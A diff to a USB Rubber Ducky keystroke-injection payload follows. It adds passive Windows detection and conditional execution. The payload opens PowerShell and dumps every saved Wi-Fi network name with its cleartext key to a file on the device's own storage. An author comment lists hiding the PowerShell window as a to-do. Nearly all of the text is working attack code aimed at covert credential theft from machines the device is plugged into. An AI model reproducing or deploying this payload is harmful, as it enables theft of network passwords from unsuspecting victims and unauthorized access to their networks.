@@ -1,7 +1,43 @@
 REM Hayden Sapp
 REM 2024-03-12
-REM TO-DO Hide powershell and OS detection
+REM TO-DO Hide powershell
 
+EXTENSION PASSIVE_WINDOWS_DETECT
+    REM VERSION 1.1
+    REM AUTHOR: Korben
+
+    REM_BLOCK DOCUMENTATION
+        Windows fully passive OS Detection and passive Detect Ready
+        Includes its own passive detect ready.
+        Does not require additional extensions.
+
+        USAGE:
+            Extension runs inline (here)
+            Place at beginning of payload (besides ATTACKMODE) to act as dynamic
+            boot delay
+            $_OS will be set to WINDOWS or NOT_WINDOWS
+            See end of payload for usage within payload
+    END_REM
+
+    REM CONFIGURATION:
+    DEFINE #MAX_WAIT 150
+    DEFINE #CHECK_INTERVAL 20
+    DEFINE #WINDOWS_HOST_REQUEST_COUNT 2
+    DEFINE #NOT_WINDOWS 7
+
+    $_OS = #NOT_WINDOWS
+
+    VAR $MAX_TRIES = #MAX_WAIT
+    WHILE(($_RECEIVED_HOST_LOCK_LED_REPLY == FALSE) && ($MAX_TRIES > 0))
+        DELAY #CHECK_INTERVAL
+        $MAX_TRIES = ($MAX_TRIES - 1)
+    END_WHILE
+    IF ($_HOST_CONFIGURATION_REQUEST_COUNT > #WINDOWS_HOST_REQUEST_COUNT) THEN
+        $_OS = WINDOWS
+    END_IF
+END_EXTENSION
+
+IF ($_OS == WINDOWS) THEN
 ATTACKMODE HID STORAGE
 DELAY 2000
 
@@ -11,3 +47,4 @@ STRINGLN powershell
 DELAY 700
 STRINGLN $m=(Get-Volume -FileSystemLabel 'DUCKY').DriveLetter;$d=netsh wlan show profile;$d=$d | Where-Object{$_ -match "All User Profile"};$d=$d -split ": " | Where-Object{$_ -notmatch "All User Profile"};$p=$d | ForEach-Object -process{netsh wlan show profiles $_ key=clear};$p | Select-String "SSID name","Key Content" >> $m':\'wireless'.txt'
 DELAY 2000
+END_IF
